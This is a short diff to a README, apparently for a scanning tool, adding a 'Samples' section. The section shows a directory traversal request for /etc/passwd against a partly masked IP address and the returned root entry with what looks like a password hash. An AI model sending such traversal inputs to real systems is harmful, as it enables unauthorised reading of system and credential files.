@@ -15,3 +15,10 @@ optional arguments:
   -l LIMIT, --limit LIMIT
   -d DEBUGLEVEL, --debuglevel DEBUGLEVEL
 ```
+
+# Samples
+
+```
+[+] 18x.xxx.xxx.59 /../../../../../../../../../../etc/passwd
+  >>> b'root:absxcfbgXtb3o:0:0:root:/:/bin/sh'
+```
